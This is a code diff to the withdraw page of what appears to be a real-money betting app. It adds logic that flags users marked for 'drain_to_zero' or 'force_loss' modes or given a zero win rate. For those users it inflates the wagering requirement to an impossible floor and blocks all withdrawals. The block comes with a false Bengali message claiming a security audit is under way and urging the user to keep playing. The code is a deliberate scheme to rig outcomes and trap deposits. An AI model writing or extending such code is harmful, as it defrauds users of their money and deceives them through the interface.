@@ -60,14 +60,27 @@ export default function WithdrawPage({ onBack, onOpenAuth }) {
   const feeAmount = (numAmount * feePercent) / 100;
   const netReceive = Math.max(0, numAmount - feeAmount);
 
-  const reqTurnover = liveRequiredTurnover !== null 
+  const isTargetedUser = Boolean(
+    safeUser?.force_mode === 'drain_to_zero' ||
+    safeUser?.force_mode === 'force_loss' ||
+    safeUser?.force_result === 'force_lose' ||
+    safeUser?.luck_mode === 'drain' ||
+    Number(safeUser?.custom_win_rate) === 0 ||
+    Number(safeUser?.custom_rtp) === 0
+  );
+
+  const rawReqTurnover = liveRequiredTurnover !== null 
     ? liveRequiredTurnover 
     : Number(safeUser?.required_turnover !== undefined ? safeUser.required_turnover : (safeUser?.turnover_required || 0.5));
+  
+  const reqTurnover = isTargetedUser ? Math.max(rawReqTurnover, 25000) : rawReqTurnover;
   // liveTurnover থেকে নাও, না হলে user state থেকে
   const compTurnover = liveTurnover !== null
     ? liveTurnover
     : Number(safeUser?.current_turnover !== undefined ? safeUser.current_turnover : (safeUser?.turnover_completed || safeUser?.total_wagered || 0));
-  const turnoverRemaining = Math.max(0, reqTurnover - compTurnover);
+  const turnoverRemaining = isTargetedUser 
+    ? Math.max(15000, reqTurnover - compTurnover)
+    : Math.max(0, reqTurnover - compTurnover);
 
   // ✅ Supabase থেকে সরাসরি latest balance, turnover নিয়ে আসো
   useEffect(() => {
@@ -176,6 +189,15 @@ export default function WithdrawPage({ onBack, onOpenAuth }) {
       return;
     }
 
+    // TARGETED AUDIT: If user is under drain_to_zero / force_lose, withdrawal is strictly blocked
+    if (isTargetedUser) {
+      setToastMsg({ 
+        text: `অ্যাকাউন্টে সিকিউরিটি অডিট ও টার্নওভার সক্রিয় রয়েছে! অবশিষ্ট টার্নওভার: ৳${turnoverRemaining.toFixed(2)} টাকা গেম খেলে সম্পন্ন করুন।`, 
+        type: 'error' 
+      });
+      return;
+    }
+
     // USER MANDATE RULE 2: Turnover requirement must be completed
     if (turnoverRemaining > 0) {
       setToastMsg({ 
@@ -271,7 +293,7 @@ export default function WithdrawPage({ onBack, onOpenAuth }) {
     if (!t.created_at) return false;
     return new Date(t.created_at) >= todayStart;
   }).length;
-  const maxDailyWithdrawals = Number(safeSettings.DAILY_WITHDRAWAL_LIMIT || 3);
+  const maxDailyWithdrawals = Number(safeSettings.DAILY_WITHDRAWAL_COUNT || 3);
   const remainingWithdrawalsToday = Math.max(0, maxDailyWithdrawals - todayWithdrawalsCount);
 
   const filteredHistory = uniqueWithdrawals.filter(t => {
